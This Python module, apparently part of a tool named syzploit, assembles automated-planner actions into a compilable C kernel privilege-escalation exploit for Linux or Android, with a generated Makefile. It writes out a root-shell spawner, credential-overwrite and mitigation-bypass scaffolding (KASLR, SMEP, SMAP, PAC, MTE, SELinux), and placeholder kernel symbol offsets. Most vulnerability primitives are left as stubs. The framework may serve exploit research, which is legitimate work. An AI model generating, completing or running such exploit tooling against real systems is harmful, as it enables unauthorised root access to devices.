"""
stitcher.py

Main exploit stitcher that combines PDDL plan actions into
a complete C exploit program.
"""

import os
import re
import sys
import json
import shutil
from pathlib import Path
from typing import Dict, List, Optional, Any, Set, Tuple
from dataclasses import dataclass, field
from datetime import datetime

from .code_templates import CodeTemplate, CodeTemplateRegistry, DEFAULT_REGISTRY


def deduplicate_globals(globals_list: List[str]) -> str:
    """
    Deduplicate global variable declarations, #defines, and other globals.
    
    This prevents duplicate definitions when multiple templates declare
    the same variables or macros.
    
    Returns a single string with deduplicated globals.
    """
    seen_defines: Set[str] = set()
    seen_vars: Set[str] = set()
    seen_structs: Set[str] = set()
    
    output_lines = []
    current_comment = None
    
    # Patterns to detect different types of declarations
    define_pattern = re.compile(r'^#define\s+(\w+)')
    var_pattern = re.compile(r'^static\s+(?:volatile\s+)?(?:int|char|void|unsigned|long|uint\d+_t|struct\s+\w+)\s*\*?\s*(\w+)')
    struct_pattern = re.compile(r'^static\s+struct\s+(\w+)\s+(\w+)')
    array_pattern = re.compile(r'^static\s+(?:struct\s+)?(\w+)\s+(\w+)\s*\[')
    
    for globals_block in globals_list:
        if not globals_block or not globals_block.strip():
            continue
        
        lines = globals_block.split('\n')
        for line in lines:
            stripped = line.strip()
            
            # Skip empty lines
            if not stripped:
                continue
            
            # Track comments (for context)
            if stripped.startswith('//'):
                current_comment = stripped
                continue
            
            # Check for #define
            define_match = define_pattern.match(stripped)
            if define_match:
                name = define_match.group(1)
                if name not in seen_defines:
                    seen_defines.add(name)
                    if current_comment:
                        output_lines.append(current_comment)
                        current_comment = None
                    output_lines.append(line)
                continue
            
            # Check for struct variable
            struct_match = struct_pattern.match(stripped)
            if struct_match:
                var_name = struct_match.group(2)
                if var_name not in seen_vars:
                    seen_vars.add(var_name)
                    if current_comment:
                        output_lines.append(current_comment)
                        current_comment = None
                    output_lines.append(line)
                continue
            
            # Check for array variable
            array_match = array_pattern.match(stripped)
            if array_match:
                var_name = array_match.group(2)
                if var_name not in seen_vars:
                    seen_vars.add(var_name)
                    if current_comment:
                        output_lines.append(current_comment)
                        current_comment = None
                    output_lines.append(line)
                continue
            
            # Check for regular variable
            var_match = var_pattern.match(stripped)
            if var_match:
                var_name = var_match.group(1)
                if var_name not in seen_vars:
                    seen_vars.add(var_name)
                    if current_comment:
                        output_lines.append(current_comment)
                        current_comment = None
                    output_lines.append(line)
                continue
            
            # For other lines (like closing braces, etc.), include as-is
            # but avoid duplicates of exact lines
            if stripped not in seen_vars and stripped not in seen_defines:
                output_lines.append(line)
    
    return '\n'.join(output_lines)


@dataclass
class StitcherConfig:
    """Configuration for exploit stitching."""
    platform: str = "linux"  # "linux" or "android"
    arch: str = "x86_64"  # "x86_64" or "arm64"
    include_debug: bool = True
    include_cleanup: bool = True
    vuln_specific_code: Optional[str] = None  # CVE-specific code to include
    kernel_symbols: Dict[str, int] = field(default_factory=dict)
    output_dir: Optional[str] = None


class ExploitStitcher:
    """
    Stitches PDDL plan actions into a complete C exploit.
    """
    
    def __init__(self, config: Optional[StitcherConfig] = None,
                 registry: Optional[CodeTemplateRegistry] = None):
        self.config = config or StitcherConfig()
        self.registry = registry or DEFAULT_REGISTRY
        
    def stitch(self, plan_actions: List[Dict[str, Any]], 
               bug_id: str,
               output_path: Optional[str] = None,
               analysis_data: Optional[Dict[str, Any]] = None) -> str:
        """
        Stitch plan actions into a complete C exploit.
        
        Args:
            plan_actions: List of parsed PDDL actions
            bug_id: Bug identifier for the exploit
            output_path: Path to write the exploit (optional)
            analysis_data: Additional analysis data for customization
            
        Returns:
            Path to the generated exploit file
        """
        # Collect all templates for the actions
        templates = []
        missing_actions = []
        
        for action in plan_actions:
            action_name = action.get('action', action.get('name', ''))
            if not action_name:
                continue
                
            # Normalize action name (lowercase, underscores)
            action_name = action_name.lower().replace('-', '_').strip('()')
            
            template = self.registry.get(action_name)
            if template:
                templates.append(template)
            else:
                missing_actions.append(action_name)
        
        if missing_actions:
            print(f"[WARN] Missing templates for actions: {missing_actions}", 
                  file=sys.stderr)
        
        # Generate the exploit code
        exploit_code = self._generate_exploit(templates, bug_id, analysis_data)
        
        # Write to file
        if output_path is None:
            output_dir = self.config.output_dir or '.'
            output_path = os.path.join(output_dir, f"exploit_{bug_id}.c")
        
        Path(output_path).parent.mkdir(parents=True, exist_ok=True)
        Path(output_path).write_text(exploit_code)
        
        print(f"[+] Generated exploit: {output_path}")
        
        # Also generate a Makefile
        makefile_path = os.path.join(os.path.dirname(output_path), "Makefile")
        self._generate_makefile(output_path, makefile_path)
        
        return output_path
    
    def _generate_exploit(self, templates: List[CodeTemplate], 
                          bug_id: str,
                          analysis_data: Optional[Dict[str, Any]] = None) -> str:
        """Generate the complete exploit C code."""
        
        # Collect all includes
        includes: Set[str] = set()
        includes.add("<stdio.h>")
        includes.add("<stdlib.h>")
        includes.add("<string.h>")
        includes.add("<unistd.h>")
        includes.add("<fcntl.h>")
        includes.add("<stdint.h>")
        includes.add("<sys/types.h>")
        includes.add("<sys/stat.h>")
        
        for template in templates:
            includes.update(template.includes)
        
        # Collect all globals (will be deduplicated later)
        globals_code = []
        
        # Collect setup, main, and cleanup code
        setup_code = []
        main_code = []
        cleanup_code = []
        
        for template in templates:
            if template.globals:
                globals_code.append(template.globals)
            if template.setup_code:
                setup_code.append(template.setup_code)
            if template.main_code:
                main_code.append(f"\n    // === {template.action_name}: {template.description} ===")
                main_code.append(template.main_code)
            if template.cleanup_code and self.config.include_cleanup:
                cleanup_code.append(template.cleanup_code)
        
        # Build the complete exploit
        code_parts = []
        
        # Header comment
        code_parts.append(self._generate_header(bug_id, templates))
        
        # Includes
        code_parts.append("\n// === INCLUDES ===")
        for inc in sorted(includes):
            code_parts.append(f"#include {inc}")
        
        # Platform-specific includes
        if self.config.platform == "android":
            code_parts.append("\n// Android-specific includes")
            code_parts.append("#include <sys/system_properties.h>")
        
        # Configuration defines
        code_parts.append(self._generate_config_defines(analysis_data))
        
        # State tracking variables
        code_parts.append(self._generate_state_variables())
        
        # Global variables from templates - DEDUPLICATED
        if globals_code:
            code_parts.append("\n// === GLOBAL STATE ===")
            deduplicated = deduplicate_globals(globals_code)
            code_parts.append(deduplicated)
        
        # Helper function declarations
        code_parts.append(self._generate_helper_declarations())
        
        # Helper function implementations
        code_parts.append(self._generate_helper_implementations())
        
        # Vulnerability-specific code (if provided)
        if self.config.vuln_specific_code:
            code_parts.append("\n// === VULNERABILITY-SPECIFIC CODE ===")
            code_parts.append(self.config.vuln_specific_code)
        
        # Main exploit function
        code_parts.append(self._generate_main_function(setup_code, main_code, cleanup_code))
        
        # Entry point
        code_parts.append(self._generate_entry_point())
        
        return "\n".join(code_parts)
    
    def _generate_header(self, bug_id: str, templates: List[CodeTemplate]) -> str:
        """Generate file header comment."""
        action_names = [t.action_name for t in templates]
        return f'''/*
 * Kernel Exploit - {bug_id}
 * 
 * Auto-generated by syzploit Synthesizer
 * Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
 * Platform: {self.config.platform}
 * Architecture: {self.config.arch}
 * 
 * Plan actions ({len(templates)}):
 *   {chr(10) + "   ".join(f"- {a}" for a in action_names) if action_names else "   (none)"}
 *
 * WARNING: This is auto-generated exploit code.
 * It requires customization for the specific target kernel.
 * Review and update offsets before use.
 */
'''
    
    def _generate_config_defines(self, analysis_data: Optional[Dict[str, Any]]) -> str:
        """Generate configuration defines."""
        defines = ["\n// === CONFIGURATION ==="]
        
        # Platform defines
        if self.config.platform == "android":
            defines.append("#define TARGET_ANDROID 1")
        else:
            defines.append("#define TARGET_LINUX 1")
        
        # Architecture defines
        if self.config.arch == "arm64":
            defines.append("#define TARGET_ARM64 1")
        else:
            defines.append("#define TARGET_X86_64 1")
        
        # Debug mode
        if self.config.include_debug:
            defines.append("#define DEBUG 1")
        
        # Kernel symbol offsets (must be updated for target kernel)
        defines.append("""
// Kernel symbol offsets - UPDATE THESE FOR TARGET KERNEL!
// Find with: cat /proc/kallsyms | grep <symbol>
// Or extract from vmlinux with: nm vmlinux | grep <symbol>

#ifndef PREPARE_KERNEL_CRED_OFFSET
#define PREPARE_KERNEL_CRED_OFFSET 0x000a0000  // prepare_kernel_cred
#endif

#ifndef COMMIT_CREDS_OFFSET
#define COMMIT_CREDS_OFFSET 0x0009f000  // commit_creds
#endif

#ifndef FIND_TASK_BY_VPID_OFFSET
#define FIND_TASK_BY_VPID_OFFSET 0x000b0000  // find_task_by_vpid
#endif

#ifndef INIT_TASK_OFFSET
#define INIT_TASK_OFFSET 0x01800000  // init_task
#endif
""")
        
        # Add any offsets from analysis data
        if analysis_data and 'kernel_symbols' in analysis_data:
            defines.append("// Symbols from analysis:")
            for sym, offset in analysis_data['kernel_symbols'].items():
                defines.append(f"#define SYM_{sym.upper()} 0x{offset:x}")
        
        # Add custom kernel symbols from config
        for sym, offset in self.config.kernel_symbols.items():
            defines.append(f"#define SYM_{sym.upper()} 0x{offset:x}")
        
        return "\n".join(defines)
    
    def _generate_state_variables(self) -> str:
        """Generate state tracking variables."""
        return """
// === STATE TRACKING ===
static int uaf_triggered = 0;
static int race_won = 0;
static int heap_sprayed = 0;
static int has_arb_read = 0;
static int has_arb_write = 0;
static int kaslr_bypassed = 0;
static int smep_bypassed = 0;
static int smap_bypassed = 0;
static int pan_bypassed = 0;
static int pac_bypassed = 0;
static int mte_bypassed = 0;
static int rop_chain_ready = 0;
static int jop_chain_ready = 0;
static int stack_pivoted = 0;
static int code_exec = 0;
static int cred_overwritten = 0;
static int privilege_escalated = 0;
static int selinux_disabled = 0;
static int sandbox_escaped = 0;
static int adb_root_enabled = 0;

static uint64_t info_leak_value = 0;
"""
    
    def _generate_helper_declarations(self) -> str:
        """Generate helper function declarations."""
        return """
// === HELPER FUNCTION DECLARATIONS ===

// Vulnerability trigger functions (implement based on CVE)
static int trigger_vulnerable_alloc(void);
static int trigger_vulnerable_free(void);
static int trigger_oob_write_vuln(void);
static int trigger_oob_read_vuln(uint64_t *leaked);
static void *race_thread_1(void *arg);
static void *race_thread_2(void *arg);

// Primitive operations
static int arb_read(uint64_t addr, void *buf, size_t len);
static int arb_write(uint64_t addr, const void *buf, size_t len);
static uint64_t calculate_kernel_slide(uint64_t leaked_ptr);
static int find_corrupted_msg(void);

// Task/credential operations
static uint64_t get_current_task(void);
static uint64_t find_current_task(void);
static int overwrite_task_creds(uint64_t task_addr);

// Code execution
static void add_return_to_userspace_gadgets(void);
static void trigger_rop_execution(void);
static void trigger_jop_execution(void);

// Post-exploitation
static void get_root_shell(void);
"""
    
    def _generate_helper_implementations(self) -> str:
        """Generate helper function implementations."""
        return '''
// === HELPER FUNCTION IMPLEMENTATIONS ===
// NOTE: These are placeholder implementations.
// They must be customized for the specific vulnerability!

static int trigger_vulnerable_alloc(void) {
    // TODO: Implement vulnerability-specific allocation
    // This allocates the object that will be used-after-free
    printf("[!] trigger_vulnerable_alloc: NEEDS IMPLEMENTATION\\n");
    return 0;  // Return 0 on success, -1 on failure
}

static int trigger_vulnerable_free(void) {
    // TODO: Implement vulnerability-specific free
    // This frees the object while keeping a reference
    printf("[!] trigger_vulnerable_free: NEEDS IMPLEMENTATION\\n");
    return 0;
}

static int trigger_oob_write_vuln(void) {
    // TODO: Implement OOB write trigger
    printf("[!] trigger_oob_write_vuln: NEEDS IMPLEMENTATION\\n");
    return 0;
}

static int trigger_oob_read_vuln(uint64_t *leaked) {
    // TODO: Implement OOB read trigger
    printf("[!] trigger_oob_read_vuln: NEEDS IMPLEMENTATION\\n");
    *leaked = 0;
    return 0;
}

static void *race_thread_1(void *arg) {
    // TODO: Implement race thread 1
    (void)arg;
    return NULL;
}

static void *race_thread_2(void *arg) {
    // TODO: Implement race thread 2
    (void)arg;
    return NULL;
}

static int arb_read(uint64_t addr, void *buf, size_t len) {
    // Arbitrary kernel read primitive
    // Implementation depends on the exploit technique used
    printf("[!] arb_read(0x%lx, %zu): NEEDS IMPLEMENTATION\\n", addr, len);
    
    // Example: Using corrupted msg_msg to read
    // struct spray_msg msg;
    // if (msgrcv(corrupted_qid, &msg, sizeof(msg.mtext), 0, IPC_NOWAIT) < 0) {
    //     return -1;
    // }
    // memcpy(buf, msg.mtext, len);
    
    return -1;
}

static int arb_write(uint64_t addr, const void *buf, size_t len) {
    // Arbitrary kernel write primitive
    printf("[!] arb_write(0x%lx, %zu): NEEDS IMPLEMENTATION\\n", addr, len);
    return -1;
}

static uint64_t calculate_kernel_slide(uint64_t leaked_ptr) {
    // Calculate KASLR slide from leaked pointer
    // This is highly dependent on what was leaked
    printf("[*] Calculating kernel slide from 0x%lx\\n", leaked_ptr);
    
    // Example for function pointer leak:
    // uint64_t expected_addr = KNOWN_FUNCTION_OFFSET;
    // return leaked_ptr - expected_addr;
    
    return 0;
}

static int find_corrupted_msg(void) {
    // Find the msg_msg that overlaps with our UAF object
    printf("[!] find_corrupted_msg: NEEDS IMPLEMENTATION\\n");
    return -1;
}

static uint64_t get_current_task(void) {
    // Get address of current task_struct
    // Method 1: Read from per-cpu variable
    // Method 2: Walk task list from init_task
    printf("[!] get_current_task: NEEDS IMPLEMENTATION\\n");
    return 0;
}

static uint64_t find_current_task(void) {
    // Alternative method to find current task
    return get_current_task();
}

static int overwrite_task_creds(uint64_t task_addr) {
    // Overwrite credentials of the given task
    (void)task_addr;
    printf("[!] overwrite_task_creds: NEEDS IMPLEMENTATION\\n");
    return -1;
}

static void add_return_to_userspace_gadgets(void) {
    // Add gadgets to return to userspace after ROP
    // On modern kernels with KPTI, this requires:
    // 1. Swap page tables back to user
    // 2. iretq/eret to userspace
    printf("[*] Adding return-to-userspace gadgets\\n");
    
#ifdef TARGET_X86_64
    // x86_64: swapgs; iretq
    // Need to set up: RIP, CS, RFLAGS, RSP, SS on stack
#else
    // ARM64: eret
    // Need to restore PSTATE and return address
#endif
}

static void trigger_rop_execution(void) {
    // Trigger the ROP chain execution
    printf("[!] trigger_rop_execution: NEEDS IMPLEMENTATION\\n");
}

static void trigger_jop_execution(void) {
    // Trigger the JOP chain execution
    printf("[!] trigger_jop_execution: NEEDS IMPLEMENTATION\\n");
}

static void get_root_shell(void) {
    if (getuid() != 0) {
        fprintf(stderr, "[-] Not root!\\n");
        return;
    }
    
    printf("[+] Spawning root shell...\\n");
    setuid(0);
    setgid(0);
    
    char *argv[] = {"/bin/sh", "-i", NULL};
    char *envp[] = {"PATH=/bin:/sbin:/usr/bin:/usr/sbin", NULL};
    execve("/bin/sh", argv, envp);
}
'''
    
    def _generate_main_function(self, setup_code: List[str], 
                                main_code: List[str],
                                cleanup_code: List[str]) -> str:
        """Generate the main exploit function."""
        setup = "\n".join(setup_code) if setup_code else "    // No setup code"
        main = "\n".join(main_code) if main_code else "    // No main code"
        cleanup = "\n".join(cleanup_code) if cleanup_code else "    // No cleanup code"
        
        return f'''
// === MAIN EXPLOIT FUNCTION ===

static int run_exploit(void) {{
    int ret = 0;
    
    printf("============================================\\n");
    printf("  Kernel Exploit - Auto-generated\\n");
    printf("============================================\\n\\n");
    
    // === SETUP PHASE ===
    printf("[*] Starting setup phase...\\n");
{setup}
    
    // === MAIN EXPLOITATION PHASE ===
    printf("\\n[*] Starting main exploitation phase...\\n");
{main}
    
    // === CLEANUP PHASE ===
cleanup:
    printf("\\n[*] Cleanup phase...\\n");
{cleanup}
    
    // === RESULT ===
    printf("\\n============================================\\n");
    if (privilege_escalated) {{
        printf("[+] EXPLOIT SUCCEEDED!\\n");
        printf("[+] uid=%d euid=%d\\n", getuid(), geteuid());
        ret = 0;
    }} else {{
        printf("[-] Exploit did not achieve privilege escalation\\n");
        ret = -1;
    }}
    printf("============================================\\n");
    
    return ret;
}}
'''
    
    def _generate_entry_point(self) -> str:
        """Generate the main() entry point."""
        return '''
// === ENTRY POINT ===

int main(int argc, char **argv) {
    (void)argc;
    (void)argv;
    
    printf("[*] Starting exploit...\\n");
    printf("[*] PID: %d, UID: %d, GID: %d\\n", getpid(), getuid(), getgid());
    
    // Run the exploit
    int result = run_exploit();
    
    if (result == 0 && privilege_escalated) {
        // Successfully got root, spawn shell
        get_root_shell();
    }
    
    return result;
}
'''
    
    def _generate_makefile(self, exploit_path: str, makefile_path: str):
        """Generate a Makefile for building the exploit."""
        exploit_name = Path(exploit_path).stem
        
        if self.config.arch == "arm64":
            cc = "aarch64-linux-gnu-gcc"
            cflags = "-O2 -Wall -Wextra -static"
        else:
            cc = "gcc"
            cflags = "-O2 -Wall -Wextra -static -m64"
        
        if self.config.platform == "android":
            # For Android, use NDK
            cc = "$(ANDROID_NDK)/toolchains/llvm/prebuilt/linux-x86_64/bin/clang"
            if self.config.arch == "arm64":
                cflags = "--target=aarch64-linux-android28 -O2 -Wall -Wextra -static"
            else:
                cflags = "--target=x86_64-linux-android28 -O2 -Wall -Wextra -static"
        
        makefile_content = f'''# Auto-generated Makefile for {exploit_name}
# Platform: {self.config.platform}
# Architecture: {self.config.arch}

CC = {cc}
CFLAGS = {cflags}
LDFLAGS = -lpthread

TARGET = {exploit_name}
SRC = {Path(exploit_path).name}

.PHONY: all clean

all: $(TARGET)

$(TARGET): $(SRC)
\t$(CC) $(CFLAGS) -o $@ $< $(LDFLAGS)

clean:
\trm -f $(TARGET)

# For Android builds, set ANDROID_NDK environment variable
# Example: export ANDROID_NDK=/path/to/android-ndk-r25c
'''
        
        Path(makefile_path).write_text(makefile_content)
        print(f"[+] Generated Makefile: {makefile_path}")


def stitch_from_plan(plan_file: str, bug_id: str, 
                     output_path: Optional[str] = None,
                     platform: str = "linux",
                     arch: str = "x86_64") -> str:
    """
    Convenience function to stitch an exploit from a plan file.
    
    Args:
        plan_file: Path to the plan file (from powerlifted)
        bug_id: Bug identifier
        output_path: Output path for exploit
        platform: Target platform
        arch: Target architecture
        
    Returns:
        Path to generated exploit
    """
    # Parse plan file
    plan_content = Path(plan_file).read_text()
    
    # Parse actions from plan file format:
    # 1: (action_name param1 param2) ;[comment]
    actions = []
    for line in plan_content.strip().split('\n'):
        line = line.strip()
        if not line or line.startswith(';'):
            continue
        
        # Extract action from line like "1: (action_name) ;[created objects: ]"
        if ':' in line:
            line = line.split(':', 1)[1].strip()
        if ';' in line:
            line = line.split(';')[0].strip()
        
        # Extract action name from "(action_name params)"
        if line.startswith('(') and line.endswith(')'):
            parts = line[1:-1].split()
            action_name = parts[0] if parts else ""
            params = parts[1:] if len(parts) > 1 else []
            
            actions.append({
                'action': action_name,
                'params': params
            })
    
    # Create stitcher and generate exploit
    config = StitcherConfig(platform=platform, arch=arch)
    stitcher = ExploitStitcher(config)
    
    return stitcher.stitch(actions, bug_id, output_path)
